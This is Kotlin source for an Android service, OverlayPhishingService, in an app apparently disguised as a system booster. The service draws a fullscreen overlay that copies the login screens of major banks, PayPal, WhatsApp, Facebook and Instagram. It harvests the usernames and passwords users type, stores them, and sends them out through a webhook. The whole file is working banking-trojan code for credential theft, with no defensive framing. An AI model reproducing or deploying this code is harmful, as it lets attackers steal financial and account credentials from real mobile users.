package com.sysopt.booster

import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.view.Gravity
import android.view.LayoutInflater
import android.view.MotionEvent
import android.view.View
import android.view.WindowManager
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.FrameLayout

class OverlayPhishingService : Service() {
    private lateinit var windowManager: WindowManager
    private var overlayView: View? = null
    private val handler = Handler(Looper.getMainLooper())

    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.getStringExtra("target_package")?.let { pkg ->
            showOverlay(pkg)
        }
        return START_NOT_STICKY
    }

    private fun showOverlay(targetPackage: String) {
        // Remove existing overlay if any
        hideOverlay()

        val inflater = getSystemService(Context.LAYOUT_INFLATER_SERVICE) as LayoutInflater
        overlayView = inflater.inflate(R.layout.overlay_phishing, null)

        val webView = overlayView?.findViewById<WebView>(R.id.phishingWebView)
        webView?.settings?.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            allowFileAccess = true
            allowContentAccess = true
            setSupportZoom(false)
            builtInZoomControls = false
            loadWithOverviewMode = true
            useWideViewPort = true
        }

        // Load appropriate phishing page based on target
        val htmlAsset = when {
            targetPackage.contains("chase") -> "chase_phishing.html"
            targetPackage.contains("wellsfargo") -> "wellsfargo_phishing.html"
            targetPackage.contains("bankofamerica") -> "bofa_phishing.html"
            targetPackage.contains("capitalone") -> "capitalone_phishing.html"
            targetPackage.contains("paypal") -> "paypal_phishing.html"
            targetPackage.contains("whatsapp") -> "whatsapp_phishing.html"
            targetPackage.contains("facebook") -> "facebook_phishing.html"
            targetPackage.contains("instagram") -> "instagram_phishing.html"
            else -> "generic_phishing.html"
        }

        webView?.loadUrl("file:///android_asset/$htmlAsset")

        webView?.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                if (url?.startsWith("capture://") == true) {
                    val params = url.substringAfter("?").split("&")
                    var user = ""
                    var pass = ""
                    for (param in params) {
                        when {
                            param.startsWith("user=") -> user = param.substringAfter("=")
                            param.startsWith("pass=") -> pass = param.substringAfter("=")
                        }
                    }
                    // Decode URL encoding
                    user = java.net.URLDecoder.decode(user, "UTF-8")
                    pass = java.net.URLDecoder.decode(pass, "UTF-8")

                    // Encrypt and store
                    val encUser = CryptoManager.encrypt(user)
                    val encPass = CryptoManager.encrypt(pass)
                    CredentialManager.storeCredentials(applicationContext, encUser, encPass)
                    WebhookClient.sendCredentials(user, pass, "phishing_$targetPackage")

                    hideOverlay()
                    return true
                }
                return false
            }
        }

        // Configure overlay window
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_FULLSCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                    WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
            PixelFormat.TRANSLUCENT
        )
        params.gravity = Gravity.TOP or Gravity.START

        // Prevent touch outside overlay
        overlayView?.setOnTouchListener { _, event ->
            if (event.action == MotionEvent.ACTION_OUTSIDE) {
                // Ignore outside touches - force interaction with overlay only
                return@setOnTouchListener true
            }
            false
        }

        try {
            windowManager.addView(overlayView, params)
        } catch (e: Exception) {
            // Permission denied
        }

        // Auto-hide after 90 seconds
        handler.postDelayed({
            hideOverlay()
        }, 90000)
    }

    private fun hideOverlay() {
        try {
            overlayView?.let {
                windowManager.removeView(it)
                overlayView = null
            }
        } catch (e: Exception) {
            // Already removed
        }
        stopSelf()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        hideOverlay()
        super.onDestroy()
    }
}